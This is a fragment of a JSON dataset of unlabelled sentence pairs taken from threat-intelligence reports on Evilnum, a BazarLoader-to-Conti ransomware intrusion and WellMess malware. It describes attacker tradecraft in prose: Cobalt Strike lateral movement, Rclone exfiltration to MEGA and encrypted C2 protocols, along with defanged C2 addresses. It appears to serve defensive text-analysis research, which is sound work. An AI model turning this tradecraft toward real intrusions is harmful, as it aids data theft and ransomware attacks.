        "id": "cti_reports_filtered/r-492.md::S31<=>S36",
        "S1": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "S2": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S34<=>S36",
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S34<=>S39",
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S34<=>S41",
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S36<=>S41",
        "S1": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S38<=>S41",
        "S1": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S50<=>S53",
        "S1": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "S2": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S0<=>S2",
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S0<=>S7",
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "When we look at our earlier Conti case, this becomes noticeable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S0<=>S10",
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S3<=>S18",
        "S1": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "S2": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S3<=>S5",
        "S1": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "S2": "There are some evident similarities in cases that involve Conti ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S4<=>S23",
        "S1": "This case saw such a conclusion.",
        "S2": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S5<=>S7",
        "S1": "There are some evident similarities in cases that involve Conti ransomware.",
        "S2": "When we look at our earlier Conti case, this becomes noticeable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S6<=>S8",
        "S1": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "S2": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S7<=>S9",
        "S1": "When we look at our earlier Conti case, this becomes noticeable.",
        "S2": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S8<=>S93",
        "S1": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "S2": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S9<=>S14",
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S9<=>S11",
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S9<=>S37",
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S9<=>S15",
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S10<=>S15",
        "S1": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S10<=>S65",
        "S1": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "S2": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S13<=>S16",
        "S1": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "S2": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S13<=>S15",
        "S1": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S14<=>S92",
        "S1": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "S2": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S15<=>S18",
        "S1": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "S2": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S16<=>S67",
        "S1": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "S2": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S17<=>S35",
        "S1": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "S2": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S19<=>S22",
        "S1": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "S2": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S20<=>S22",
        "S1": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "S2": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S23<=>S65",
        "S1": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "S2": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S26<=>S29",
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S26<=>S28",
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S26<=>S40",
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "D8B3.dll injected into the Winlogon process (high integrity):",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S37<=>S42",
        "S1": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "S2": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S37<=>S49",
        "S1": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "S2": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S39<=>S41",
        "S1": "Followed by D8B3.dll:",
        "S2": "In the case of D8B3.dll, the DLL was Go compiled.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S40<=>S53",
        "S1": "D8B3.dll injected into the Winlogon process (high integrity):",
        "S2": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S46<=>S49",
        "S1": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.",
        "S2": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S50<=>S53",
        "S1": "However, we did not observe many events of interest during these sessions.",
        "S2": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S52<=>S71",
        "S1": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "S2": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S53<=>S77",
        "S1": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "S2": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S53<=>S55",
        "S1": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "S2": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S61<=>S64",
        "S1": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "S2": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S61<=>S63",
        "S1": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "S2": "The use of this tool has been observed in other recent intrusions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S65<=>S67",
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S65<=>S69",
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S65<=>S90",
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S66<=>S80",
        "S1": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S67<=>S72",
        "S1": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "S2": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S67<=>S78",
        "S1": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "S2": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S71<=>S73",
        "S1": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "S2": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S72<=>S74",
        "S1": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "S2": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S73<=>S102",
        "S1": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S75<=>S80",
        "S1": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S76<=>S79",
        "S1": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
        "S2": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S78<=>S80",
        "S1": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S80<=>S83",
        "S1": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "S2": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S80<=>S82",
        "S1": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "S2": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S81<=>S98",
        "S1": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "S2": "Here\u2019s an overview of the execution:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S84<=>S90",
        "S1": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "S2": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S85<=>S87",
        "S1": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "S2": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S91<=>S93",
        "S1": "They first pinged systems across the network via an interactive command shell.",
        "S2": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S93<=>S95",
        "S1": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "S2": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S93<=>S99",
        "S1": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "S2": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S95<=>S97",
        "S1": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "S2": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S97<=>S102",
        "S1": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md::S98<=>S102",
        "S1": "Here\u2019s an overview of the execution:",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S0<=>S2",
        "S1": "The WellMess sample we examine in this insight is written in Go, though .NET WellMess samples also exist.",
        "S2": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S1<=>S4",
        "S1": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "S2": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S1<=>S62",
        "S1": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S2<=>S8",
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S2<=>S62",
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S2<=>S13",
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S3<=>S7",
        "S1": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "S2": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S4<=>S6",
        "S1": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "S2": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S6<=>S8",
        "S1": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "S2": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S7<=>S10",
        "S1": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "S2": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S8<=>S11",
        "S1": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "S2": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S8<=>S10",
        "S1": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "S2": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S10<=>S69",
        "S1": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "S2": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S10<=>S13",
        "S1": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S11<=>S14",
        "S1": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "S2": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S11<=>S13",
        "S1": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S16<=>S19",
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S16<=>S22",
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S16<=>S57",
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S17<=>S28",
        "S1": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:",
        "S2": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S19<=>S21",
        "S1": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "S2": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S21<=>S23",
        "S1": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "S2": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S22<=>S61",
        "S1": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "S2": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S22<=>S24",
        "S1": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "S2": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S24<=>S26",
        "S1": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "S2": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S24<=>S29",
        "S1": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "S2": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S26<=>S30",
        "S1": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "S2": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S26<=>S29",
        "S1": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "S2": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S28<=>S39",
        "S1": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "S2": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S29<=>S35",
        "S1": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "S2": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S29<=>S32",
        "S1": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "S2": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S30<=>S32",
        "S1": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "S2": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S30<=>S77",
        "S1": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "S2": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S33<=>S35",
        "S1": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
